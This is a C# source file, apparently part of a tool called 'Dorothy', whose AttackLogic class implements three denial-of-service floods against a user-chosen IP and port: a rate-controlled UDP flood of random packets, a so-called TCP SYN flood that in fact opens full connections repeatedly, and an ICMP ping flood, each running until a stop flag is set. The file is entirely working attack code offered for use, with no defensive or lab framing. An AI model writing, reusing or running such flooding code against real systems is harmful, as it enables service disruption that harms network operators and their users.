using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Threading.Tasks;

namespace Dorothy
{
    public class AttackLogic
    {
        private volatile bool _stopAttack = false;

        // Method to start the UDP flood
        public Task StartUdpFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartUdpFlood method");
            return Task.Run(async () =>
            {
                try
                {
                    log($"Debug: Creating UdpClient");
                    using (UdpClient udpClient = new UdpClient())
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
                        log($"Debug: Target endpoint created: {targetEndpoint}");

                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: UDP Flood initialized. Target: {targetEndpoint}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            udpClient.Send(buffer, buffer.Length, targetEndpoint);
                            bytesSent += buffer.Length;
                            packetsSent++;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: UDP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: UDP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    Thread.Sleep(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            await Task.Delay((int)delay);
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"Debug: UDP Flood error: {ex.Message}");
                    log($"Debug: Stack trace: {ex.StackTrace}");
                }
                finally
                {
                    log("Debug: UDP Flood attack stopped.");
                }
            });
        }

        // Method to start the TCP SYN flood
        public void StartTcpSynFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            new Thread(() =>
            {
                try
                {
                    IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
                    byte[] buffer = new byte[1024]; // Dummy buffer for TCP packet simulation

                    long packetsSent = 0;
                    long bytesSent = 0;
                    long targetBytesPerSecond = mbps * 125000L;
                    DateTime startTime = DateTime.Now;

                    while (!_stopAttack)
                    {
                        try
                        {
                            using (Socket tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                            {
                                tcpSocket.Connect(targetEndpoint);
                                tcpSocket.Send(buffer);
                                packetsSent++;
                                bytesSent += buffer.Length;
                                tcpSocket.Close();
                            }
                        }
                        catch (SocketException)
                        {
                            log("Unable to connect for TCP SYN flood");
                        }

                        if ((DateTime.Now - startTime).TotalSeconds >= 1)
                        {
                            log($"TCP SYN Flood: {packetsSent} packets sent at {mbps} Mbps");
                            startTime = DateTime.Now;
                            packetsSent = 0;
                            bytesSent = 0;
                        }

                        if (bytesSent >= targetBytesPerSecond)
                        {
                            Thread.Sleep(1000);
                            bytesSent = 0;
                        }
                    }
                }
                catch (Exception ex)
                {
                    log("TCP SYN Flood error: " + ex.Message);
                }
            }).Start();
        }

        // Method to start the ICMP flood
        public void StartIcmpFlood(string targetIp, int mbps, Action<string> log)
        {
            _stopAttack = false;
            new Thread(() =>
            {
                try
                {
                    using (Ping pingSender = new Ping())
                    {
                        byte[] buffer = Encoding.ASCII.GetBytes(new string('A', 32)); // ICMP packet payload
                        PingOptions options = new PingOptions();
                        long packetsSent = 0;
                        long bytesSent = 0;
                        long targetBytesPerSecond = mbps * 125000L;
                        DateTime startTime = DateTime.Now;

                        while (!_stopAttack)
                        {
                            PingReply reply = pingSender.Send(targetIp, 1000, buffer, options);
                            if (reply.Status == IPStatus.Success)
                            {
                                packetsSent++;
                                bytesSent += buffer.Length;
                            }

                            if ((DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                log($"ICMP Flood: {packetsSent} packets sent at {mbps} Mbps");
                                startTime = DateTime.Now;
                                packetsSent = 0;
                                bytesSent = 0;
                            }

                            if (bytesSent >= targetBytesPerSecond)
                            {
                                Thread.Sleep(1000);
                                bytesSent = 0;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    log("ICMP Flood error: " + ex.Message);
                }
            }).Start();
        }

        // Method to stop the attack
        public void StopAttack()
        {
            _stopAttack = true;
        }
    }
}